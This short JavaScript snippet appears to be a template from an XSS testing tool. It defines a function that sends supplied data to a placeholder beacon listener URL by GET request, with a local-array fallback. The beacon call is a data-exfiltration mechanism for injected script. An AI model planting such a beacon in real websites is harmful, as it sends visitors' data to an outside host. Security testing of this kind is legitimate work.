
xss_array = []

function xss(data) {
  try {
    // Send payload to beacon listener via a simple GET request
    var xhr = new XMLHttpRequest();
    var url = "{BEACON_URL}?data=" + encodeURIComponent(data);
    xhr.open("GET", url, true);
    xhr.send();
  } catch (e) {
    // Fall back to local array logging (backup)
    try { xss_array.push(data); } catch (e2) {}
  }
}
